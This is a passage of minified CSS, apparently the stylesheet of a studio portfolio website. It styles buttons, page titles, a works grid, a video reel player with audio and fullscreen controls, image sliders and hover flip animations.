2.83333vh;-webkit-appearance:none;-moz-appearance:none;appearance:none;border:none;outline:none;background:transparent;color:#030303}.ui-select .ui-select-arrow{color:#030303;position:absolute;right:0;top:0;width:8.5vh;height:8.5vh;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;pointer-events:none}.btn{cursor:pointer}.btn a,.section .btn a{text-decoration:none}.btn-mailto a{pointer-events:none}.btn-circle{cursor:pointer;width:8.5vh;height:8.5vh;color:#030303;font-weight:400}.btn-circle,.btn-circle-body{overflow:hidden;border-radius:100%}.btn-circle-body{background-color:#fafafa;width:100%;height:100%;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-transform:scale(0);transform:scale(0)}._fliped .btn-circle-body{-webkit-transform:scale(1);transform:scale(1);-webkit-transition:all .6s cubic-bezier(.4,.22,.21,1.04)!important;transition:all .6s cubic-bezier(.4,.22,.21,1.04)!important}.btn-circle *{pointer-events:none}.btn-wrap .t{font-weight:400}.section-cult .btn-wrap{right:calc(8.5vh - 10px);bottom:calc(8.5vh - 10px);position:absolute;z-index:2}.btn{width:21.25vh;height:8.5vh;border-radius:8.5vh;display:block;position:relative;border:1px solid hsla(0,0%,100%,.1);-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04)}.btn,.btn *,.section .btn{text-decoration:none}.btn *{pointer-events:none}.btn-body{height:100%;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-ms-flex-align:center;align-items:center;padding:0 2.83333vh}.btn-body span{display:block}.btn .flip-a{line-height:1.2;height:1.2em}.js--state-mouse-pause .is-page-in-reel .site-header,.js--state-mouse-pause .is-page-in-reel .ui-fade-out,.js--state-mouse-pause .is-page-in-reel .ui-splash-in,.js--state-mouse-pause .is-page-in-reel .ui-toggle .t{opacity:0!important;-webkit-transition:opacity .8s cubic-bezier(.4,.22,.21,1.04)!important;transition:opacity .8s cubic-bezier(.4,.22,.21,1.04)!important}.ui-num{font-weight:400;height:17vh;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.ui-num .mid{padding:0 .15em}.ui-num .bd{text-indent:-9999px;width:20px;height:2px;margin:-1px 1em 0;background:hsla(0,0%,100%,.1)}.ui-num .min{display:-webkit-box;display:-ms-flexbox;display:flex}.ui-num .max{height:1em}.ui-num .max,.ui-num .min{line-height:1}.d-move div,.ui-num .d{height:15px;width:.6em}.ui-num .d{overflow:hidden}.ui-num .in{height:auto}.ui-num-body{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.site-control,.site-control *{pointer-events:none}.site-control{pointer-events:all}.js--anchor-scroll{cursor:pointer;pointer-events:all}.site-control{position:fixed;width:8.5vh;height:8.5vh}.is-page-in-404 .site-control,.is-page-in-reel .site-control{display:none}.site-control-in{position:absolute;top:-1.0625vh;left:-1.0625vh;width:10.625vh;height:10.625vh}.site-control-body[data-type=progress]{top:50%;margin-top:-5.3125vh}.site-control-body{position:absolute;height:100%;width:100%}.path{fill:none;stroke:#fafafa;stroke-width:2;stroke-linecap:square;stroke-linejoin:round;stroke-miterlimit:10}.path.progress-f{stroke-width:5}.site-control-body[data-type=text].flip-vr{-webkit-writing-mode:vertical-rl;-ms-writing-mode:tb-rl;writing-mode:vertical-rl}.site-control-body[data-type=text].flip-vr .flip-vr-body{width:auto;padding-right:.15em}.site-control-body[data-type=text].flip-vr .flex{-webkit-transform:translate(0);transform:translate(0);-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.site-control-body[data-type=text].flip-vr .flex .b,.site-control-body[data-type=text].flip-vr .flex .f{width:1.2em;padding:0;line-height:1.2}.site-control-body[data-type=logo]{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.site-control-body[data-type=logo] .logo-svg-wrap{width:70%;height:70%;position:relative;overflow:hidden}.site-control-body[data-type=logo] .logo-svg{top:auto;left:auto;position:relative;width:100%;height:100%;-webkit-transform:none;transform:none}.site-control-body[data-type=progress],.site-control-body[data-type=text]{-webkit-transform:scale(1);transform:scale(1)}.site-control-body[data-type=counter]{-webkit-transform:scale(0);transform:scale(0);-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04)}.site-control-counter-move span{display:block;text-align:center}.site-control-counter-ol{position:absolute;top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%);line-height:1.5;height:1.5em;overflow:hidden;position:relative;width:100%}.site-control-counter-move{-webkit-transform:translate(0);transform:translate(0)}.cursor-pivot{position:absolute;top:50%;left:50%;height:1px;width:1px;display:block}.js--control-type-counter .site-control-body[data-type=counter]{-webkit-transform:scale(1);transform:scale(1)}.js--control-type-counter .site-control-body[data-type=progress]{-webkit-transform:scale(1)!important;transform:scale(1)!important}.site-control{left:calc(8.5vh - 10px);bottom:calc(8.5vh - 10px)}.site-control-arrow{position:absolute;right:calc(8.5vh - 10px);bottom:calc(8.5vh - 10px);left:auto;opacity:.15}.single-body .site-control-arrow{bottom:0}.site-control-arrow .path{stroke-width:2}.site-control-arrow .site-control-in{overflow:hidden}.page-about .page-body{margin-top:-15vh}.page-contact .flex-body.f-3 .flex-li{margin-top:0}.site-control-body[data-type=text]{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.js--slide-down{display:block}.page-title-wrap{width:100%;height:100%;position:relative}.page-title-in .title-wrap{height:100%;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-ms-flex-wrap:wrap;flex-wrap:wrap;position:absolute;top:0;left:0;width:100%;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-transform:uppercase}.page-title-in .page-title-ja{height:1em;line-height:1;text-indent:.1em;margin-top:.1em;letter-spacing:-.1em}.page-title-in .page-title-ja,.page-title-in .title .ja{-webkit-transform:translateY(-.05em) scale(1.05,.95);transform:translateY(-.05em) scale(1.05,.95)}.page-title-in .title .ja{line-height:1;font-weight:700}.page-title-in .title-wrap .title{width:100%}.page-title-in .title a{display:inline-block;text-decoration:none}.page-title-in .title a *{pointer-events:none}.page-title-in .title .l{display:block;width:100%}.is-page-in-works .page-title-in .title,.page-title-in .title .l{line-height:1.3;margin:-.3em 0 0}.page-title-in .title-wrap .support{font-family:Now,sans-serif;line-height:1;font-weight:400;margin:0 0 1.5em;height:1em;width:100%;display:none;text-decoration:none}.page-title-in .title-wrap a.support{font-weight:500;display:block}.page-title-in .title-wrap{-webkit-transform-origin:-40vw 50%;transform-origin:-40vw 50%}.page-title-in{padding-right:10vw;height:23.56vw;display:-webkit-box;display:-ms-flexbox;display:flex}.is-page-in-home .title-wrap[data-visible="0"],.is-page-in-home .title-wrap[data-visible="0"] *{visibility:hidden;pointer-events:none}.page-title-center .page-title-in{padding-right:0}.page-title-center .page-title-in .title-wrap .title{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.page-title-center .title-a-wrap{text-align:center}.title-a-wrap{display:inline-block;vertical-align:top}.page-title-wrap{height:23.56vw;position:absolute;top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.section-title-wrap .page-title-in{height:auto}.section-title-wrap .page-title-wrap{top:auto;height:auto;position:relative;-webkit-transform:translate(0);transform:translate(0)}.section-title-wrap .page-title-in .title-wrap{position:relative}.section-title-wrap .page-title-in .title{padding:0}.page-title-front{overflow:hidden;-webkit-clip-path:polygon(0 19%,100% 0,100% 100%,0 81%);clip-path:polygon(0 19%,100% 0,100% 100%,0 81%)}.page-title-back{overflow:visible}.page-title-back .title-a{-webkit-text-stroke-width:1px;-webkit-text-stroke-color:hsla(0,0%,100%,.15);color:transparent}.page-title-in .title-wrap .title{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.page-header .page-title-in .title .ja,.page-title-front .page-title-in .title .ja{-webkit-text-stroke-width:1px;-webkit-text-stroke-color:#fff;color:transparent}.a-pagging-body{padding:0 calc(8.5vh - 10px);display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-ms-flex-wrap:wrap;flex-wrap:wrap}.a{cursor:pointer}.a *,.is-page-tr-start .a{pointer-events:none}.a-to-next{display:block}.page-header .js--click{width:100%;height:100%;position:absolute;top:0;left:0;z-index:1;pointer-events:all}[data-type=pages] .section-page-lead{z-index:2}.page-header .page-title-wrap{height:auto;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.page-header .page-title-in{height:auto;padding-right:15vw;padding-left:15vw}.page-header .page-title-in .title-wrap{position:relative}.page-title-move{position:relative;width:100%;height:100%}.page-title-move .page-title{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0}.page-title-move .page-title._active{z-index:2;opacity:1}.page-title-move-wrap-ghost,.page-title-move-wrap-ghost *{pointer-events:none!important}.page-content p{line-height:1.6}.section .p a{color:#fafafa;text-decoration:underline}.section .flex-li .h3,.section .flex-li .h4{margin-bottom:.2em}.section{font-weight:300}.section-information.section .p a,.section .p{color:#8c8c8c}.section-information.section .p a[target=_blank]{color:#fafafa}.section .flex-li .h3,.section .flex-li .h4{font-weight:400}.page-footer,.page-footer-body,.page-header,.page-header-body,.section{position:relative;width:100%}.page-header-body{height:100vh}.thin .page-header-body{height:85vh}.page-header-bg{height:80vh}.section{padding-top:1px;margin-top:-1px}.section a{text-decoration:underline}.section:first-child{padding-top:0;margin-top:0}.section-bg-none{background:transparent}.section-bg-black2,.section-bg-black2 .section-bg{background-color:#060606}.section-bg{position:absolute;z-index:0;top:0;left:0;width:100%;height:100%}.ja-title{letter-spacing:.2em;-webkit-writing-mode:vertical-rl;-ms-writing-mode:tb-rl;writing-mode:vertical-rl;line-height:1;max-height:8em}.flex-layout{display:-webkit-box;display:-ms-flexbox;display:flex}.f-1{width:22.5%}.f-2{width:50%}.f-3,.f-4{width:77.5%}.flex-li{padding-right:2em}.flex-body.f-2,.flex-body.f-3,.flex-body.f-4{display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-top:-2em;width:77.5%}.section-layout[data-layout=credit],.section-layout[data-layout=outline]{padding:5vh 0}.section-layout[data-layout=outline] .flex-header.f-1{margin-top:0;width:50%}.section-layout[data-layout=outline] .flex-body.f-2{margin-top:-.5em;width:50%;padding-left:2.5vw}.flex-body.f-2 .flex-li{width:50%;margin-top:2em}.flex-body.f-3 .flex-li{width:33.333%;margin-top:2em}.flex-body.f-4 .flex-li{width:25%;margin-top:2em}.section-client .flex-body.f-2 .flex-li,.section-client .flex-body.f-3 .flex-li,.section-client .flex-body.f-4 .flex-li{width:50%}.flex-ul.f-3 .flex-li,.flex-ul.f-4 .flex-li{margin-bottom:.5em;margin-top:0}.flex-body.award-ul.f-3 .flex-li,.flex-body.award-ul.f-4 .flex-li{width:100%;display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:baseline;-ms-flex-align:baseline;align-items:baseline}.flex-body.award-ul.f-3 .flex-li .h4,.flex-body.award-ul.f-4 .flex-li .h4{padding-right:1em}.flex-li .h3,.flex-li .h4{font-weight:500}.img-1col-li{padding:7.5vh 0}.img-1col-li:first-child{padding-top:20vh}.img-1col-li:last-child{padding-bottom:20vh}.caption.right{width:50%;margin:0 0 0 auto;padding-left:2.5vw}.caption.left{width:50%;padding-right:2.5vw}.img-2col-li .caption.left,.plane{width:100%}.plane{height:100px;position:relative}.plane[data-layout=cols],.plane[data-layout=fullscreen],.plane[data-layout=normal],.plane[data-layout=slide]{background:hsla(0,0%,100%,.02)}.plane .source{width:100px;display:none;pointer-events:none}.img-2col-ul{display:-webkit-box;display:-ms-flexbox;display:flex}.img-2col-li{width:50%}.iframe-fullscreen-body,.img-fullscreen-body{width:100%;height:100%}.iframe-fullscreen-body .bg-frame{width:100%;height:100%;position:absolute;z-index:2;opacity:0;-webkit-transition:all 2s cubic-bezier(.4,.22,.21,1.04);transition:all 2s cubic-bezier(.4,.22,.21,1.04)}.iframe-fullscreen-body iframe{width:100%;height:100%}.iframe-fullscreen-body.iframe-loaded .bg-frame{opacity:1;z-index:4}.iframe-fullscreen-body .btn-circle{position:absolute;top:50%;left:50%;z-index:3;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.award-year{width:5em;padding-right:1em}.award-body{width:calc(100% - 5em);display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:baseline;-ms-flex-align:baseline;align-items:baseline}.img-stack-body{width:100%}.img-stack-ul{position:relative;width:100%}.img-stack-li{width:25%;position:absolute;left:50%;bottom:0;-webkit-transform-origin:center center;transform-origin:center center;-webkit-transform:translate(-50%);transform:translate(-50%)}.img-stack-li:first-child{position:relative}.dot-control{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.dot-control,.dot-control .dot-body{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.dot-control .dot-body{margin:0 -5px}.dot-control .dot-wrap{padding:5px;cursor:pointer}.dot-control .dot{pointer-events:none;opacity:.15;border-radius:100%;width:8px;height:8px;border:1px solid #fafafa;background:transparent;-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04)}.dot-control .active .dot{opacity:1;background:#fafafa}.dot-control-wrap{height:15vh;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.img-slide-wrap .body{width:100%}.img-slide-body{height:60vh;cursor:-webkit-grab;cursor:grab}.img-slide-ul{width:9999px;position:relative}.img-slide-wrap{padding:20vh;padding:10vw 15vw}.img-slide-li{float:left;padding-right:5vw}.js-dragging body *{cursor:-webkit-grabbing;cursor:grabbing}.img-mobile-ul{margin:-2.5vw;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.img-mobile-li{padding:0 2.5vw;width:33.3333%}.body.thin .img-mobile-ul{margin:-2.5vw}.img-mobile-ul .img-stack-body{padding-bottom:15%;-webkit-box-sizing:content-box;box-sizing:content-box}.img-tablet-body{width:80%;margin:0 auto}.body.thin .img-tablet-body{width:100%}.section-layout[data-layout=cols][data-prev=slide] .spr-before,.section-layout[data-layout=credit]>.spr,.section-layout[data-layout=mobile][data-next=mobile] .spr-after,.section-layout[data-layout=mobile][data-next=outline] .spr-after,.section-layout[data-layout=mobile][data-prev=tablet] .spr-before,.section-layout[data-layout=outline].is-not-next-fullscreen .spr-after,.section-layout[data-layout=outline][data-prev=card] .spr-before,.section-layout[data-layout=outline][data-prev=normal] .spr-before,.section-layout[data-layout=outline][data-prev=slide] .spr-before{display:none}.section-layout[data-layout=credit][data-prev=fullscreen]>.spr-before,.section-layout[data-layout=outline][data-next=card] .spr-after,.section-layout[data-layout=outline][data-next=credit] .spr-after{display:block}.section-layout[data-layout=mobile][data-next=fullscreen] .spr-after,.section-layout[data-layout=mobile][data-next=fullscreen][data-prev=fullscreen] .spr-after,.section-layout[data-layout=mobile][data-next=fullscreen][data-prev=fullscreen] .spr-before,.section-layout[data-layout=mobile][data-prev=fullscreen] .spr-before{height:30vh}.section-title{font-weight:500;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.page-header .section-information,.section-title{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.page-header .section-information{bottom:0;position:absolute;height:20vh}.section-text .flex-body.f-3,.section-text .flex-body.f-4{margin:0}.js--flip .flip-o{display:inline-block;overflow:hidden}.js--flip .flip-c{display:inline-block;opacity:0;-webkit-transform:translateY(100%);transform:translateY(100%)}._fliped.js--flip .flip-c,._fliped .js--flip .flip-c{opacity:1;-webkit-transition:all 1s cubic-bezier(.4,.22,.21,1.04);transition:all 1s cubic-bezier(.4,.22,.21,1.04);-webkit-transform:translate(0);transform:translate(0)}.section-page-lead{opacity:0}.post-li,.post-ul{width:100%}.post-li{display:-webkit-box;display:-ms-flexbox;display:flex;margin-bottom:2em}.post-li:last-child{margin-bottom:0}.post-li-header{width:10%}.post-li-body{width:90%}.post-li-body .h3{margin-bottom:.5em}.table-tr{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:baseline;-ms-flex-align:baseline;align-items:baseline}.table-tr .th{width:33%}.table-tr .td{width:66%}.table-tr .td br{display:none}.logo-large-wrap{width:100%;height:100%;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;display:-webkit-box;display:-ms-flexbox;display:flex}.logo-large{height:55vh;width:55vh;border-radius:100%;overflow:hidden;background-color:#fafafa}.logo-large path{fill:#fafafa}.post-li-flex{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.post-li-flex-head{padding-right:2em}.post-ul-wrap{width:100%}.apply-footer{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.js--goto-next-page-timer{cursor:pointer}.js--goto-next-page-timer a{pointer-events:none}.page-header .subpage-title-wrap{display:none}.section.works-wrap{width:66vw;margin:calc(-30vh + 1vw) auto 0}.grid{grid-auto-flow:dense;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;grid-gap:1vw;display:grid;grid-auto-rows:3.4375vw;grid-template-columns:repeat(auto-fit,15.75vw)}.works-empty{grid-column:span 2;grid-row:span 2}.works-li[data-size=l]{grid-column:span 3;grid-row:span 6}.works-li[data-size=m]{grid-column:span 2;grid-row:span 4}.works-li[data-size=s]{grid-column:span 1;grid-row:span 2}.grid-pos-left .works-a{margin:0 0 0 auto}.grid-pivot{width:100%;height:100%}.works-a,.works-a a{width:100%;height:100%;display:block}.works-a a{z-index:2;top:0;left:0;position:absolute}.work-title{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;width:100%;height:100%;z-index:1;padding:0 2em;text-align:center;font-weight:600}.ui-category{line-height:1}.ui-category .in{display:block}.ui-category-li{text-align:right}.ui-category-li .cursor-pivot{left:-5px;top:0}.ui-category .n{border-radius:.5em;border:1px solid hsla(0,0%,100%,.1)}.ui-category .flip-a{display:block;line-height:1.4;height:1.4em}.ui-category .nuxt-link-exact-active{-webkit-transform:translate(-.5em);transform:translate(-.5em)}.img-cult-ul{position:relative;display:-webkit-box;display:-ms-flexbox;display:flex;width:270vw}.img-cult-li{-webkit-box-sizing:content-box;box-sizing:content-box;margin-right:5vw;width:40vw}.img-cult-wrap{display:-webkit-box;display:-ms-flexbox;display:flex;width:540vw;-webkit-animation:loop 120s linear infinite forwards;animation:loop 120s linear infinite forwards}.img-cult-li:first-child{margin-top:0}.img-cult-li:nth-child(2){margin-top:20vw}.img-cult-li:nth-child(3){margin-top:10vw}.img-cult-li:nth-child(4){margin-top:0}.img-cult-li:nth-child(5){margin-top:10vw}.img-cult-li:nth-child(6){margin-top:20vw}.page-title-wrap{z-index:2}@-webkit-keyframes loop{0%{-webkit-transform:translate(0);transform:translate(0)}to{-webkit-transform:translate(-270vw);transform:translate(-270vw)}}@keyframes loop{0%{-webkit-transform:translate(0);transform:translate(0)}to{-webkit-transform:translate(-270vw);transform:translate(-270vw)}}.section .cult-link-wrap{display:block;position:absolute;top:50%;left:15vw;z-index:3}.section .cult-link{display:block;text-decoration:none;font-weight:500;-webkit-transform:translateY(-12.4vw);transform:translateY(-12.4vw)}.plane[data-type=video] .bg-img{position:absolute;top:0;left:0}.plane[data-type=video] video{z-index:3;position:relative}.reel-body .plane{width:100%;height:100%;margin:0 auto;cursor:pointer;overflow:hidden}.reel-inner{position:relative}.ui-audio-status{opacity:0;-webkit-transform:scale(.9);transform:scale(.9);top:50%;left:50%;position:fixed;pointer-events:none;-webkit-transition:all .4s cubic-bezier(.4,.22,.21,1.04);transition:all .4s cubic-bezier(.4,.22,.21,1.04);margin:-4.25vh 0 0 -4.25vh}.js--ratio-by-full{max-height:100%;max-width:100%}.reel-inner{-webkit-box-align:center;-ms-flex-align:center;align-items:center;height:100%;height:100vh;padding:0}.reel-inner,.ui-audio-in{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;width:100%}.ui-audio-in{cursor:pointer;position:relative;height:14px}.ui-audio-in .b-ol{height:100%;width:2px;overflow:hidden;position:relative;margin-right:2px}.ui-audio-in .b-ol:last-child{margin-right:0}.js--audio-play{cursor:pointer}.ui-audio-in .b-ol .b{height:100%;width:100%;background-color:#fafafa;-webkit-transform:translateY(100%);transform:translateY(100%);opacity:1;-webkit-transition:opacity .6s cubic-bezier(.4,.22,.21,1.04);transition:opacity .6s cubic-bezier(.4,.22,.21,1.04)}.js--state-sound-on .ui-audio-body .b-ol .b{opacity:1}.js--state-reel-paused .ui-audio-status{opacity:1;-webkit-transform:scale(1);transform:scale(1)}.ui-video-progress{width:100%;cursor:pointer;height:4.25vh;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end;cursor:-webkit-grab;cursor:grab}.js--state-reel-seeking .ui-video-progress{cursor:-webkit-grabbing;cursor:grabbing}.ui-video-progress *{pointer-events:none}.ui-video-progress-body{height:2px;width:100%;position:relative}.ui-video-progress .bar{-webkit-transform:scaleX(0);transform:scaleX(0);-webkit-transform-origin:center left;transform-origin:center left}.ui-video-progress .bar,.ui-video-progress .bg{position:absolute;top:0;left:0;height:100%;width:100%;background-color:#fafafa}.ui-video-progress .bg{opacity:.1}.section-reel{height:100%}.is-loading-complete .is-page-in-reel .logo-wrap,.is-loading-complete .is-page-in-reel .ui-fade-out,.is-loading-complete .is-page-in-reel .ui-splash-in,.is-loading-complete .is-page-in-reel .ui-toggle-in{-webkit-transition:all 1.2s!important;transition:all 1.2s!important}.is-loading-complete.js--state-reel-playing.js--state-mouse-paused .is-page-in-reel .site-header .logo-wrap,.is-loading-complete.js--state-reel-playing.js--state-mouse-paused .is-page-in-reel .site-header .ui-toggle-in{-webkit-transform:translateY(-20px)!important;transform:translateY(-20px)!important;opacity:0!important}.is-loading-complete.js--state-reel-playing.js--state-mouse-paused .is-page-in-reel .site-content .ui-fade-out,.is-loading-complete.js--state-reel-playing.js--state-mouse-paused .is-page-in-reel .site-content .ui-splash-in{-webkit-transform:translateY(20px)!important;transform:translateY(20px)!important;opacity:0!important}.is-loading-complete.js--state-reel-playing.js--state-mouse-paused .is-page-in-reel *{cursor:none!important}.ui-fullscreen{cursor:pointer}.ui-fullscreen-body{height:14px}.ui-fullscreen-body .b{width:50%;height:50%;position:absolute}.ui-fullscreen-body .lt,.ui-fullscreen-body .lt .in div{left:0;top:0}.ui-fullscreen-body .rt,.ui-fullscreen-body .rt .in div{right:0;top:0}.ui-fullscreen-body .lb,.ui-fullscreen-body .lb .in div{left:0;bottom:0}.ui-fullscreen-body .rb,.ui-fullscreen-body .rb .in div{right:0;bottom:0}.ui-fullscreen-body .b .in div{background:#fafafa}.ui-fullscreen-body .b-v{position:absolute;height:4px;width:2px}.ui-fullscreen-body .b-h{position:absolute;height:2px;width:6px}.section-title-404{position:absolute;top:50%;left:50%;font-weight:700;font-family:Neue,sans-serif;font-size:8.905vw;line-height:1;text-align:center;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);text-transform:uppercase}.editor h2,.editor h3,.editor h4{color:#fafafa;line-height:1.25;margin:1em 0}.editor h2,.editor h3,.editor h4,.editor strong{font-weight:500}.editor h2,.editor h3,.editor h4{margin-top:2em}.editor p{color:#8c8c8c;margin-bottom:1em}.editor a{color:#fafafa}.editor :first-child{margin-top:0}.editor :last-child{margin-bottom:0}.editor ol,.editor ul{margin-bottom:1em;padding-left:1.25em}.editor ul li{list-style:disc}.editor ol li{list-style:decimal}.editor blockquote{position:relative;padding:0;margin:2em 0}.editor blockquote *{display:inline}.editor blockquote:before{content:"\\201C"}.editor blockquote:after{content:"\\201D"}.caption b,.editor b{font-weight:400}.caption{width:100%}.caption h2,.caption h3,.caption h4{margin:3em 0 1em}[data-layout=card] .caption h2,[data-layout=card] .caption h3,[data-layout=card] .caption h4{margin:0 0 1em}.caption p{margin:1em 0 0;color:#8c8c8c}.caption p:first-child{margin-top:3em}.js--slide-up-wrap{overflow:hidden}.is-page-in-reel #js--gl-back,.is-page-in-works #js--gl-back,.is-tr-type-menu .page-content,.is-tr-type-menu .site-body{opacity:0!important}.page-title-in .title,.site-nav-li{text-transform:uppercase}.page-title-in .title{padding:.3em 0 0}.flip-a-wrap .b .s,.flip-a-wrap .f .s,.flip-a .b .s,.flip-a .f .s,.site-nav-a .b .s,.site-nav-a .f .s{display:block;-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04)}.flip-vr-body{width:1.7em}.site-control .flip-vr-body .f{line-height:1.2}.flip-vr .flex .b,.flip-vr .flex .f{line-height:1;width:1.7em;padding:.35em}.flip-vr-body .t{line-height:1;-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04);display:block}.flip-vr-body .f .t{-webkit-transform-origin:top right;transform-origin:top right;-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.flip-vr-body .b .t{-webkit-transform-origin:top left;transform-origin:top left;-webkit-transform:rotate(-16deg) translate(0);transform:rotate(-16deg) translate(0)}.flip-a-wrap .f .s,.flip-a .f .s{-webkit-transform-origin:center left;transform-origin:center left;-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.flip-a-wrap .b .s,.flip-a .b .s{-webkit-transform-origin:center right;transform-origin:center right;-webkit-transform:rotate(8deg) translateY(50%);transform:rotate(8deg) translateY(50%)}.title-a.flip-a .f .s{-webkit-transform-origin:center left;transform-origin:center left;-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.title-a.flip-a .b .s{-webkit-transform-origin:center right;transform-origin:center right;-webkit-transform:rotate(2.5deg) translateY(50%);transform:rotate(2.5deg) translateY(50%)}.site-nav-a .f .s{-webkit-transform-origin:center left;transform-origin:center left;-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.site-nav-a .b .s{-webkit-transform-origin:center right;transform-origin:center right;-webkit-transform:rotate(3deg) translateY(50%);transform:rotate(3deg) translateY(50%)}.is-not-touch .flip-a-wrap:hover .t,.is-not-touch .flip-a:hover .t{-webkit-transform:translateY(-50%);transform:translateY(-50%)}.is-not-touch .flip-a-wrap:hover .f .s,.is-not-touch .flip-a:hover .f .s{-webkit-transform:rotate(-8deg) translate(0);transform:rotate(-8deg) translate(0)}.is-not-touch .flip-a-wrap:hover .b .s,.is-not-touch .flip-a:hover .b .s{-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.is-not-touch .title-a.flip-a:hover .f .s{-webkit-transform:rotate(-2.5deg) translate(0);transform:rotate(-2.5deg) translate(0)}.is-not-touch .title-a.flip-a:hover .b .s{-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.is-not-touch .btn:hover{border:1px solid #fafafa}.is-not-touch .flip-vr:hover .flex{-webkit-transform:translate(0);transform:translate(0)}.is-not-touch .flip-vr:hover .flip-vr-body .f .t{-webkit-transform-origin:top right;transform-origin:top right;-webkit-transform:rotate(16deg) translate(0);transform:rotate(16deg) translate(0)}.is-not-touch .flip-vr:hover .flip-vr-body .b .t{-webkit-transform-origin:top left;transform-origin:top left;-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.is-not-touch .site-nav-a._hover .f .s{-webkit-transform:rotate(-3deg) translate(0);transform:rotate(-3deg) translate(0)}.is-not-touch .site-nav-a._hover .b .s{-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}.nuxt-link-exact-active.site-nav-a .b .s,.nuxt-link-exact-active.site-nav-a .f .s{-webkit-transition:none!important;transition:none!important;-webkit-transform:rotate(0deg) translate(0)!important;transform:rotate(0deg) translate(0)!important}.is-not-touch.is-page-tr-start .a-all .flip-a-wrap .t,.is-not-touch.is-page-tr-start .a-all .flip-a .t{-webkit-transition:none;transition:none;-webkit-transform:translate(0);transform:translate(0)}.is-not-touch.is-page-tr-start .a-all .flip-a-wrap .b .s,.is-not-touch.is-page-tr-start .a-all .flip-a-wrap .f .s,.is-not-touch.is-page-tr-start .a-all .flip-a .b .s,.is-not-touch.is-page-tr-start .a-all .flip-a .f .s,.is-not-touch.is-page-tr-start .a-all .title-a.flip-a .b .s,.is-not-touch.is-page-tr-start .a-all 